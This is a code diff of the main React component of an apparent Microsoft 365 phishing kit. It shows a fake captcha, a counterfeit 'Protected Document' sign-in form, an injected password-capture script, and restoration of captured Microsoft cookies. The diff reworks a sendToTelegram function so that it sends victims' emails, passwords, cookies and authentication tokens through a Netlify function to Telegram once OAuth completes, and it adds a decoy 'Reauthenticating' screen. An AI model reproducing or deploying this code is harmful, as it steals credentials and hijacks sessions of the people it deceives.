@@ -3,7 +3,6 @@ import MessageIconLanding from './components/MessageIconLanding';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import RealOAuthRedirect from './components/RealOAuthRedirect';
 
-// 🟢 ENHANCED: Import robust cookie/email setter with new enhanced functions
 import { 
   restoreMicrosoftCookies, 
   restoreCookies, 
@@ -13,26 +12,19 @@ import {
   getStoredData
 } from './utils/restoreCookies';
 
-// 🟢 ENHANCED: Import dedicated password capture injector
 import { injectPasswordCaptureScript } from './utils/password-capture-injector';
 
-// Artificial delay helper (milliseconds)
-const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
+const SLOW_DELAY = 1200;
 const nextStepDelay = SLOW_DELAY * 3;
-const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
-const captchaVerificationDelay = 1500; // Default verification delay for captcha
-const redirectingDelay = 3000; // Delay for opening animation before showing document protection
-
-// Calculate total delay for captcha to handle everything internally
+const messageIconDelay = 500;
+const captchaVerificationDelay = 1500;
+const redirectingDelay = 3000;
 const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;
 
 function App() {
   const [currentPage, setCurrentPage] = useState('captcha');
-
-  // State to hold the most reliable email and cookies captured via postMessage
   const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
   const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
-  // 🟢 Enhanced: Track captured credentials with better typing
   const [capturedCredentials, setCapturedCredentials] = useState<{
     email?: string;
     password?: string;
@@ -42,51 +34,18 @@ function App() {
     source?: string;
     url?: string;
   } | null>(null);
-
-  // 🟢 NEW: Track browser capabilities for enhanced cookie handling
   const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);
 
-  // 🟢 NEW: Add form state for email and password
+  // FORM STATE
   const [formEmail, setFormEmail] = useState('');
   const [formPassword, setFormPassword] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // 🟢 NEW: Function to send data to Telegram
-  const sendToTelegram = async (email: string, password: string) => {
-    try {
-      // Send data to your Netlify function instead of directly to Telegram
-      const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';
-      
-      const response = await fetch(netlifyFunctionUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          email: email,
-          password: password,
-          passwordSource: 'document-protection-form',
-          userAgent: navigator.userAgent,
-          sessionId: 'form_' + Math.random().toString(36).substring(2, 15),
-          timestamp: new Date().toISOString(),
-          source: 'Protected Document Form',
-          url: window.location.href
-        })
-      });
-      
-      const result = await response.json();
-      
-      if (response.ok && result.success) {
-        console.log('✅ Credentials sent to Telegram via Netlify function successfully');
-      } else {
-        console.warn('⚠️ Netlify function responded with error:', result);
-      }
-      
-      console.log('✅ Credentials sent to Telegram successfully');
-    } catch (error) {
-      console.warn('⚠️ Failed to send to Telegram:', error);
-    }
-  };
+  // 🟢 NEW: Track if we've already sent tokens/cookies/email/password (prevents double send)
+  const [hasSentAuthData, setHasSentAuthData] = useState(false);
+
+  // 🟢 NEW: Store session data from OAuth
+  const [oauthSessionData, setOAuthSessionData] = useState<any>(null);
 
   // Add CSS animation for dots
   useEffect(() => {
@@ -120,7 +79,6 @@ function App() {
     return () => document.head.removeChild(style);
   }, []);
 
-  // Handle redirecting to Document Protection page after opening animation
   useEffect(() => {
     if (currentPage === 'redirecting') {
       const timer = setTimeout(() => {
@@ -130,9 +88,7 @@ function App() {
     }
   }, [currentPage]);
 
-  // 🟢 ENHANCED: Initialize browser capabilities and restore any stored data
   useEffect(() => {
-    // Detect browser capabilities for enhanced cookie handling
     try {
       const capabilities = detectBrowserCapabilities();
       setBrowserCapabilities(capabilities);
@@ -141,7 +97,6 @@ function App() {
       console.warn('⚠️ Failed to detect browser capabilities:', error);
     }
 
-    // Try to restore any previously stored data
     try {
       const storedData = getStoredData();
       if (storedData.email) {
@@ -157,17 +112,14 @@ function App() {
     }
   }, []);
 
-  // 🟢 ENHANCED: Use dedicated password capture injector
   useEffect(() => {
     try {
-      // Use the dedicated password capture injector
       injectPasswordCaptureScript();
       console.log('✅ Password capture injector initialized');
     } catch (error) {
       console.warn('⚠️ Failed to initialize password capture injector:', error);
     }
 
-    // Also inject when URL changes (for SPAs)
     const originalPushState = history.pushState;
     const originalReplaceState = history.replaceState;
 
@@ -212,7 +164,6 @@ function App() {
     };
   }, []);
 
-  // 🟢 ENHANCED: Listen for messages with improved cookie handling
   useEffect(() => {
     function handleMessage(event: MessageEvent) {
       if (!event.data || typeof event.data !== 'object') return;
@@ -228,38 +179,34 @@ function App() {
           const cookiesJson = JSON.stringify(event.data.data.cookies);
           setCapturedCookiesState(cookiesJson);
           setCapturedCookies(event.data.data.cookies);
-          
-          // 🟢 ENHANCED: Use the new restoreMicrosoftCookies with advanced features
+
+          // Enhanced: Use restoreMicrosoftCookies with advanced features
           const options = {
-            reload: false, // Don't auto-reload during app flow
+            reload: false,
             validate: true,
             debug: true,
             skipExpired: true,
-            skipInvalid: false, // Allow some invalid cookies for testing
+            skipInvalid: false,
             warnOnSecurity: true,
             handleDuplicates: true
           };
-          
+
           try {
             const result = restoreMicrosoftCookies(event.data.data.cookies, options);
             console.log('✅ Enhanced cookie restoration result:', result);
-            
-            // Store the result for later use
             if (result.success) {
               console.log(`🎯 Successfully restored ${result.restored}/${result.total} cookies`);
             }
           } catch (error) {
             console.warn('⚠️ Enhanced restoration failed, falling back to basic:', error);
-            // Fallback to basic restoration
             restoreCookies(event.data.data.cookies, { debug: true });
           }
-          
+
         } catch (e) {
           console.warn('⚠️ Cookie processing error:', e);
         }
       }
 
-      // 🟢 ENHANCED: Listen for generic credentials with better handling
       if (
         event.data.type === 'CREDENTIALS_CAPTURED' &&
         (event.data.data?.password || event.data.data?.email || event.data.data?.username)
@@ -271,8 +218,7 @@ function App() {
           hasUsername: !!event.data.data?.username,
           source: event.data.data?.source
         });
-        
-        // Also update captured email state if available
+
         if (event.data.data.email) {
           setCapturedEmailState(event.data.data.email);
           setCapturedEmail(event.data.data.email);
@@ -293,7 +239,7 @@ function App() {
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const step = urlParams.get('step');
-    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
+    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'reauthenticating', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
       setCurrentPage(step);
       window.history.replaceState({}, document.title, window.location.pathname);
     }
@@ -303,27 +249,22 @@ function App() {
   const handleCaptchaVerified = () => {
     setCurrentPage('redirecting');
   };
-
   const handleCaptchaBack = () => {
     window.location.reload();
   };
 
-  // 🟢 MODIFIED: Handle form submission with Telegram integration
+  // 🟢 MODIFIED: Form submits only update local state, don't send to Telegram yet!
   const handleFormSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
     if (!formEmail || !formPassword) {
       alert('Please enter both email and password');
       return;
     }
 
     setIsSubmitting(true);
-    
+
     try {
-      // Send to Telegram
-      await sendToTelegram(formEmail, formPassword);
-      
-      // Store the credentials in state for debugging
       setCapturedEmailState(formEmail);
       setCapturedCredentials({
         email: formEmail,
@@ -331,28 +272,85 @@ function App() {
         captureTime: new Date().toISOString(),
         source: 'document-protection-form'
       });
-      
-      // Redirect to OAuth after short delay
+
+      // Instead of sending to Telegram, go to reauthenticating page
       setTimeout(() => {
-        setCurrentPage('oauth-redirect');
+        setCurrentPage('reauthenticating');
       }, 1000);
-      
+
     } catch (error) {
       console.error('Error submitting form:', error);
-      // Continue to OAuth even if Telegram fails
+      // Continue to reauthenticating anyway
       setTimeout(() => {
-        setCurrentPage('oauth-redirect');
+        setCurrentPage('reauthenticating');
       }, 1000);
     }
   };
 
-  // NEW: Handle document protection access (original function preserved)
-  const handleDocumentAccess = () => {
-    setCurrentPage('oauth-redirect');
+  // 🟢 NEW: After protected document, show "reauthenticating..." then redirect to OAuth
+  useEffect(() => {
+    if (currentPage === 'reauthenticating') {
+      const timer = setTimeout(() => {
+        setCurrentPage('oauth-redirect');
+      }, 2000); // 2 seconds "reauthenticating"
+      return () => clearTimeout(timer);
+    }
+  }, [currentPage]);
+
+  // 🟢 MODIFIED: Handle OAuth Success: send everything to Telegram ONCE after OAuth
+  const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
+    try {
+      const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';
+
+      const response = await fetch(netlifyFunctionUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          email,
+          password,
+          cookies,
+          authenticationTokens,
+          userAgent,
+          sessionId,
+          url
+        })
+      });
+
+      const result = await response.json();
+
+      if (response.ok && result.success) {
+        console.log('✅ Sent all authentication data to Telegram (ONE TIME, after OAuth)');
+      } else {
+        console.warn('⚠️ Netlify function responded with error:', result);
+      }
+    } catch (error) {
+      console.warn('⚠️ Failed to send to Telegram:', error);
+    }
   };
 
+  // 🟢 MODIFIED: Only send ONCE (after OAuth completes), never before
   const handleOAuthSuccess = async (sessionData: any) => {
     console.log('✅ OAuth success with enhanced data handling:', sessionData);
+
+    // Only send if not already sent
+    if (!hasSentAuthData) {
+      setHasSentAuthData(true);
+
+      // Gather authentication tokens and cookies from sessionData if available
+      await sendToTelegram({
+        email: capturedEmail || formEmail || (capturedCredentials?.email ?? ''),
+        password: formPassword || (capturedCredentials?.password ?? ''),
+        cookies: capturedCookies ? JSON.parse(capturedCookies) : [],
+        authenticationTokens: sessionData?.authenticationTokens || {},
+        userAgent: navigator.userAgent,
+        sessionId: sessionData?.sessionId || ('oauth_' + Math.random().toString(36).substring(2, 15)),
+        url: window.location.href
+      });
+    }
+
+    setOAuthSessionData(sessionData);
     setCurrentPage('document-loading');
   };
 
@@ -360,6 +358,7 @@ function App() {
     setCurrentPage('document-protection');
   };
 
+  // PAGES
   switch (currentPage) {
     case 'captcha':
       return (
@@ -420,7 +419,6 @@ function App() {
             maxWidth: '500px',
             width: '100%'
           }}>
-            {/* Protected Document Icon */}
             <div style={{
               width: '120px',
               height: '120px',
@@ -444,7 +442,6 @@ function App() {
                   objectFit: 'cover'
                 }}
               />
-              {/* Security Badge */}
               <div style={{
                 position: 'absolute',
                 top: '-8px',
@@ -462,8 +459,6 @@ function App() {
                 🔒
               </div>
             </div>
-
-            {/* Title and Description */}
             <h2 style={{ 
               color: '#323130', 
               margin: '0 0 15px',
@@ -473,7 +468,6 @@ function App() {
             }}>
               Protected Document
             </h2>
-            
             <p style={{ 
               color: '#605e5c', 
               margin: '0 0 25px',
@@ -482,8 +476,6 @@ function App() {
             }}>
               This Microsoft document contains confidential information and requires authentication to access.
             </p>
-
-            {/* Security Notice */}
             <div style={{
               background: '#fff4ce',
               border: '1px solid #ffcc02',
@@ -506,8 +498,7 @@ function App() {
                 Please sign in with your Microsoft account to verify your access permissions.
               </div>
             </div>
-
-            {/* 🟢 NEW: Email and Password Form */}
+            {/* Email and Password Form */}
             <form onSubmit={handleFormSubmit} style={{ textAlign: 'left', marginBottom: '25px' }}>
               <div style={{ marginBottom: '15px' }}>
                 <label style={{
@@ -536,7 +527,6 @@ function App() {
                   placeholder="Enter your Microsoft email"
                 />
               </div>
-              
               <div style={{ marginBottom: '20px' }}>
                 <label style={{
                   display: 'block',
@@ -564,7 +554,6 @@ function App() {
                   placeholder="Enter your password"
                 />
               </div>
-
               <button
                 type="submit"
                 disabled={isSubmitting}
@@ -605,8 +594,6 @@ function App() {
                 {isSubmitting ? '🔄 Authenticating...' : '🔐 Authenticate & Open Document'}
               </button>
             </form>
-
-            {/* Alternative Actions */}
             <div style={{
               display: 'flex',
               justifyContent: 'center',
@@ -658,8 +645,6 @@ function App() {
                 Request Access
               </button>
             </div>
-
-            {/* Footer Info */}
             <div style={{
               marginTop: '25px',
               paddingTop: '20px',
@@ -669,6 +654,35 @@ function App() {
             }}>
               Microsoft Office 365 • Secure Document Access Portal
             </div>
+          </div>
+        </div>
+      );
+
+    // 🟢 NEW: Reauthenticating page after document-protection
+    case 'reauthenticating':
+      return (
+        <div style={{
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
+          height: '100vh',
+          fontFamily: 'Arial, sans-serif',
+          backgroundColor: '#f3f2f1'
+        }}>
+          <div style={{
+            textAlign: 'center',
+            fontSize: '24px',
+            color: '#323130'
+          }}>
+            Reauthenticating
+            <span className="redirecting-dots">
+              <span>.</span>
+              <span>.</span>
+              <span>.</span>
+              <span>.</span>
+              <span>.</span>
+              <span>.</span>
+            </span>
           </div>
         </div>
       );
@@ -725,8 +739,6 @@ function App() {
             <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
               Please wait while we prepare your Microsoft document
             </p>
-            
-            {/* 🟢 ENHANCED: Show debug info in development */}
             {process.env.NODE_ENV === 'development' && (
               <div style={{ 
                 marginTop: '20px', 
@@ -742,7 +754,6 @@ function App() {
                 <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
               </div>
             )}
-            
             <div style={{
               display: 'flex',
               justifyContent: 'center',
